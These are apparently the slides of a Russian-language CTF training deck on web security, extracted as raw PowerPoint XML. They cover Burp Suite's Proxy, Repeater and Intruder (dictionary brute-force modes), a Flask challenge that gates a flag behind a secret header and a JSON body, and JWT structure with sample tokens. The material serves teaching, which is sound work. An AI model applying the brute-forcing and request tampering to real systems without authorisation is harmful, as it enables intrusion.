      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="13" name="TargetScreenshot" descr="Снимок экрана 2026-10-17 18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874519"/>
            <a:ext cx="7434072" cy="377647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069080" y="2029968"/>
            <a:ext cx="1234440" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="28575">
            <a:solidFill>
              <a:srgbClr val="E0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87368" y="2423160"/>
            <a:ext cx="7114032" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="28575">
            <a:solidFill>
              <a:srgbClr val="E0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581009"/>
            <a:ext cx="10820369" cy="9239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Burp Suite: раздел Proxy</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="FlagIco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969" y="6229350"/>
            <a:ext cx="457200" cy="457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2551176"/>
            <a:ext cx="2871216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Intercept (Перехват)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880360"/>
            <a:ext cx="2871216" cy="7863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Ставит запрос на паузу до отправки, позволяя править его прямо в моменте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" y="4050792"/>
            <a:ext cx="2871216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HTTP history (Журнал)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517136"/>
            <a:ext cx="2871216" cy="7863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Хранит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все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запросы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и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ответы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</a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="13" name="ProxyScreenshot" descr="Снимок экрана 2026-10-17 1811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874519"/>
            <a:ext cx="7434072" cy="380390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069080" y="2029968"/>
            <a:ext cx="1417320" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="28575">
            <a:solidFill>
              <a:srgbClr val="E0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69080" y="2423160"/>
            <a:ext cx="7434072" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="28575">
            <a:solidFill>
              <a:srgbClr val="E0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581009"/>
            <a:ext cx="10820369" cy="9239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3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Burp Suite: </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="3300" b="1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раздел</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="33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Repeater</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="FlagIco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969" y="6229350"/>
            <a:ext cx="457200" cy="457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2600960"/>
            <a:ext cx="3200400" cy="2288032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405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7448" y="2907792"/>
            <a:ext cx="2871216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Repeater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C97070"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uLnTx/>
              <a:uFillTx/>
              <a:latin typeface="DejaVu Sans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46080" y="3314700"/>
            <a:ext cx="2871216" cy="7863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Отправляет повторно любой измененный запрос на лету, позволяя сразу видеть ответ сервера без перезагрузки страницы.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+mn-ea"/>
              <a:cs typeface="+mn-cs"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="13" name="RepeaterScreenshot" descr="Снимок экрана 2026-10-17 181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737360"/>
            <a:ext cx="6903720" cy="426110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389120" y="2286000"/>
            <a:ext cx="457200" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="28575">
            <a:solidFill>
              <a:srgbClr val="E0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407408" y="2907792"/>
            <a:ext cx="3291840" cy="1600200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="28575">
            <a:solidFill>
              <a:srgbClr val="E0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581009"/>
            <a:ext cx="10820369" cy="9239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Burp Suite: раздел Intruder</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="FlagIco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969" y="6229350"/>
            <a:ext cx="457200" cy="457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1737360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405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50392" y="1865376"/>
            <a:ext cx="2871216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Принцип работы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C97070"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uLnTx/>
              <a:uFillTx/>
              <a:latin typeface="DejaVu Sans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50392" y="2194560"/>
            <a:ext cx="2871216" cy="7863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Автоматически перебирает параметры запроса по словарю, подставляя значения в нужные места (позиции) и проверяя ответы сервера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61442"/>
            <a:ext cx="3200400" cy="2759678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405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0392" y="3929269"/>
            <a:ext cx="2871216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Режимы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атаки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C97070"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uLnTx/>
              <a:uFillTx/>
              <a:latin typeface="DejaVu Sans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0392" y="4315968"/>
            <a:ext cx="2871216" cy="7863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Sniper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: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перебор по одной точке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Battering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ru-RU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ram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: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подстановка одного слова во все точки сразу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Pitchfork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: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параллельный перебор нескольких списков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Cluster </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="ru-RU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bomb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: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полный перебор всех комбинаций (декартово произведение)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+mn-ea"/>
              <a:cs typeface="+mn-cs"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="13" name="IntruderScreenshot" descr="Снимок экрана 2026-10-17 1811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874519"/>
            <a:ext cx="7434072" cy="378561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114800" y="2852928"/>
            <a:ext cx="1325880" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="28575">
            <a:solidFill>
              <a:srgbClr val="E0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62288" y="2286000"/>
            <a:ext cx="2240280" cy="2423160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="28575">
            <a:solidFill>
              <a:srgbClr val="E0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A8C4AA80-0FFF-4C5D-939F-2B8805C0C4FE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Headers: задание</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="14" name="Рисунок 13" descr="Скриншот выполнения из writeup_for_web.pptx, объединённый с карточкой задания.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6533C907-B315-4B8B-B5AF-502BC4AFF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266825" y="2311962"/>
            <a:ext cx="6000750" cy="3177052"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="v2-text-1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{71C87B47-4139-44E4-A831-DD6D113F1D15}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8420100" y="1857375"/>
            <a:ext cx="308610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21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Собрать</a:t>
            </a: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1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запрос</a:t>
            </a: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, </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="21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который</a:t>
            </a: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1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принимает</a:t>
            </a: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1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обработчик</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" sz="2175" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty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  <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="v2-text-2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E9D86F30-F5F0-4B03-861C-37021DF3B59B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8420100" y="4343400"/>
            <a:ext cx="3086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950" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0" err="1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Совместная</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="1950" b="0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950" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0" err="1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практика</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" sz="1950" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="C97070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  <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="v2-text-3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{386C95A6-E99D-4F9C-93A8-446A6B16B2B6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8420100" y="5267325"/>
            <a:ext cx="3086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A9B7C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A9B7C6"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="0" sz="1725" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="467886"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uLnTx/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consola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127.0.0.1:8081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10084E4-1876-4036-AF21-5C0820AB0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872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FE4B8D5-5A1B-47CB-8FC6-13A199BE725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Headers: код и запрос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F9C1B7-EF20-48AF-9312-609D57FD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900" name="editable-code-24-900">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CAA09B0C-CCFF-4770-9AC9-B09A854A3964}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5481638" y="1466850"/>
            <a:ext cx="6019800" cy="470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@app.route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'/'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44747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def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main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()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return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render_template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'index.html'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65" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="FFD700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@app.route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'/give_me_my_flag'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,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7BA7D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methods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=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[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'FLAG'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]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44747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def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give_me_my_flag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()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if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request.headers.get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'Flag-Header'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!=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"I-am-real-flag-owner"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   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return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jsonify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{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"bebebe"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"no flags for you"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}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65" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="FFD700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try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    data =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json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.loads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request.data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except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   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return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jsonify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{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"bebebe"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"no flags for you"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}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65" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="FFD700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if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"flags?"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not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in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data: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   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return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jsonify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{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"bebebe"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"no flags for you"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}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65" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="FFD700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if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type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data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[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"flags?"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]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!=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list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   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return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jsonify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{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"bebebe"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"no flags for you"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}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65" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="FFD700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if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len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data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[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"flags?"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]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!=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2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   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return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jsonify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{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"bebebe"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"no flags for you"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}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65" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="FFD700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for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i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in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range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len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data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179FFF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[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"flags?"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179FFF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]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   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if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data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[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"flags?"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][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i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]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!=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f"trying to get flag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{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i+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1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}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time"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       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return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jsonify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{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"bebebe"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"no flags for you"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}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65" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="FFD700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return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jsonify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{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"here is your flag, little CTFer"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 read_flag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179FFF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()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}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65" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="FFD700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44747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def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read_flag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()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return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Path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os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.environ.get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'FLAG_FILE'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, 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'/run/lab/flag.txt'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.read_text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7BA7D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encoding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=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'utf-8'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.strip</a:t>
            </a:r>
            <a:r>
              <a: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F98E9A7-E435-4290-95B4-D999DE879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68" y="2213171"/>
            <a:ext cx="4742996" cy="2873221"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="901" name="Headers-field-map-901">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E31A117D-B4DF-45BA-9565-4D3108FCD788}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="4953000" y="2105025"/>
            <a:ext cx="742950" cy="219075"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="C970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2" name="Headers-field-map-902">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E31A117D-B4DF-45BA-9565-4D3108FCD788}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="4953000" y="2457450"/>
            <a:ext cx="742950" cy="285750"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="C970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3" name="Headers-field-map-903">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E31A117D-B4DF-45BA-9565-4D3108FCD788}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="4953000" y="3028950"/>
            <a:ext cx="742950" cy="123825"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="C970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" name="Headers-field-map-904">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E31A117D-B4DF-45BA-9565-4D3108FCD788}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="4953000" y="3648075"/>
            <a:ext cx="742950" cy="133350"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="C970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5" name="Headers-field-map-905">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E31A117D-B4DF-45BA-9565-4D3108FCD788}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4953000" y="4210050"/>
            <a:ext cx="742950" cy="361950"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="C970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739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FE4B8D5-5A1B-47CB-8FC6-13A199BE725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Headers: ответ обработчика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F9C1B7-EF20-48AF-9312-609D57FD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4D2DAF-E0D3-4928-870D-659A6A12A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801" y="1862085"/>
            <a:ext cx="8125096" cy="4414890"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="v2-text-1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F159F364-1765-4F28-8ABB-1DEE4F6D49F1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1859801" y="1376699"/>
            <a:ext cx="7877261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ru-RU" sz="2175" b="0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Отправляем запрос        Получаем ответ</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" sz="2175" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="C97070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285867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C777FBC6-4704-4B41-87F0-8F2DCB65F577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JWT: вход и доступ к API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D20A161E-C608-47FF-ADBE-9F4F3E68AE67}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="587189" y="2623297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После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входа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пользователь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обращается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к API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без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повторного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ввода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пароля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.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Для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этого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приложение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может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выдать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подписанный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токен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3" name="issue-heading">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DAE07078-A3EF-4352-B742-B817ACE6074D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="768720" y="3798794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При</a:t>
            </a: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входе</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" sz="2100" b="1" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="C97070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issue-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{49D36169-8F30-41B7-BB34-5A2E8A08DA3F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="768720" y="4389344"/>
            <a:ext cx="495300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202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Сервер</a:t>
            </a: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02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проверяет</a:t>
            </a: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02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учётные</a:t>
            </a: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02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данные</a:t>
            </a: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и </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="202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создаёт</a:t>
            </a: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02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токен</a:t>
            </a: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с </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="202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идентификатором</a:t>
            </a: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02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пользователя</a:t>
            </a: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, </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="202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сроком</a:t>
            </a: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02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действия</a:t>
            </a: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и </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="202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нужными</a:t>
            </a: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02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утверждениями</a:t>
            </a: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5" name="check-heading">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5B86A0DE-1822-4049-A1D4-8F032F1AD2D8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="3798794"/>
            <a:ext cx="506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При</a:t>
            </a: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запросе</a:t>
            </a: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к API</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="check-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{290E8203-7A7C-44B9-9E98-842EC16A7B85}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="4389344"/>
            <a:ext cx="506730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Клиент передаёт токен. API проверяет подпись, срок действия и право пользователя выполнить конкретную операцию.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="foot">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CA5E21B0-39A6-4FCE-85EA-2B1A6C54C839}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="587189" y="1581150"/>
            <a:ext cx="10191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</a:rPr>
              <a:t>JWT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</a:rPr>
              <a:t> –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</a:rPr>
              <a:t>это открытый стандарт (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</a:rPr>
              <a:t>RFC 7519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</a:rPr>
              <a:t>) для безопасного обмена данными между сторонами в виде компактных JSON-объектов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endParaRPr kumimoji="0" sz="1875" b="0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  <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Рисунок 13">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{398910BC-8C96-9E10-603C-F54C8D14D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22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3AE7B1-8811-A044-8AB7-D12BC8660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6E638429-D20A-973E-6425-60304B4BDE73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JWT: вход и проверка токена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E538FF3-8C2D-24B7-70A0-7D03FF271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7" name="v2-text-1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2BCBB76C-8035-16E5-9F73-14130E217DBB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1859801" y="1376699"/>
            <a:ext cx="7877261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endParaRPr kumimoji="0" sz="2175" b="0" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="C97070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  <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="15" name="Picture 5" descr="jwt_transparent_no_title.png">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A643AAE8-8E73-BF09-DA04-D5384468E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44" y="1504950"/>
            <a:ext cx="11183112" cy="47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96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B3611A05-AC5C-4EA3-A641-4DECAB04580C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JWT: header, payload и подпись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9D43C4F-A296-476E-85B3-C105EB352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17" name="v7-text-68">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{37F1C00C-4EFD-43AB-9B06-20B65DEBF3B3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133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header</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="v7-text-69">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C24E24A6-50BE-4890-8425-24D85402F763}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2190750" y="1952625"/>
            <a:ext cx="9315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650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eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="v7-text-70">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F74A42B8-FB02-4478-B19A-9D9411A1A286}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="2390775"/>
            <a:ext cx="133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payload</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="v7-text-71">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{80DCA7CD-D75D-428D-A3A3-A9DBE980BB96}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2190750" y="2390775"/>
            <a:ext cx="9315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650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eyJzdWIiOiIxNyIsIm5hbWUiOiJhbGV4IiwiZXhwIjoyMDAwMDAwMDAwfQ</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="v7-text-72">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6633FCC7-977B-4B6E-906E-12D28D5547AA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="2828925"/>
            <a:ext cx="133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signature</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="v7-text-73">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{671EF9BD-DD95-437D-A566-2AF52189CF63}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
